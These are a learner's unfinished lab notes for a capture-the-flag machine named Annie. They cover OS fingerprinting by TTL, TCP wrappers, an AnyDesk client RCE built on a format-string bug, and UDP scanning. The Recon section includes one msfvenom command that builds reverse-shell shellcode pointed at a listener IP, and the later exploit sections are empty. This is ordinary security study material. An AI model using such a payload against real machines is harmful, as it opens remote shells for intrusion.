# Annie Helped-Through

Name: Annie
Date:  
Difficulty:  Medium
Goals:  
- Keep OSCP mindset and method
- Power through this brain fuzz flu with fun and community
- Concatenate my OSCP notes and my QBM for a better workflow, improving cpabablities and retention
- \*Bins usage for the red team
- Patch the vuln
- Write my Naabu script replacement for masscan in AutomateRecon
Learnt:
Beyond Root:
- Patch the exploit

I decided to take a break from pretty much everything as this brain fuzz from this flu is still going to keep affecting me. Needed to think about my challanges and objectives for the year so the time helped. So I am here once again with Helped-Through just because I have felt at peak cognitively for like 4-5 weeks. Christmas was a good distraction from that, but life goes on. I also want to finish off [[Temple-Helped-Through]], [[Biblioteca-Helped-Through]] and [[Agent-T-Writeup]] along with [[Aratus-Helped-Through]] to round out some beyond root activities I need to do. Also I need to push my execise routine to higher than it was pre 2023 and these stream have the stream raiders segements to get up, stretch and pound out another straight one punch man plus extras.


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Al asks what [TCP wrappers](https://en.wikipedia.org/wiki/TCP_Wrappers)
- [How to bypass](https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan)

[AnyDesk Client RCE](https://www.exploit-db.com/exploits/49613) is format string vulnerability, which is using formatting of strings in functoin calls with a foprmat specifier  `"%s"`, which points to a  character array that is reference after the literal string `"string data here"`. These character arrays are terminated with a null byte to indicate that the string has ends. Basically you can use `printf` usign format strings that are point to parts of memory that can be used to dump memory it should not. Or with `scanf` write data to memory. `C` has a history of unsafe memory handling, there aer safer versions of functions that are still commonly referrenced in modern C tutorials and bootcamps. 

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=31337 -b "\x00\x25\x26" -f python -v shellcode
```

Al points out this is ACTUALLY a UDP exploit from reading the script. Read the script

Just scan the port indicated in the exploit... 

UDP scan:
- only if a port is closed will RST packet be sent, if a firewall is in the way you will get alot of false poistive

Remote Desktop Software will often use UDP for fast a possible data streaming.

Linear jumping around of my how tackling the issue.

## Exploit

## Foothold

## PrivEsc

## Beyond Root

      
